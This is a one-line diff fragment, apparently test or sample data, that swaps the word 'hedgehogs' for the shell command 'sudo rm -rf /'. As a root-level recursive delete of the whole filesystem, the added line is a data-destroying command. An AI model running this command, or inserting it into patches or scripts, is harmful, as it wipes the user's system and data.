@@ -1,1 +1,1 @@
-hedgehogs
+sudo rm -rf /
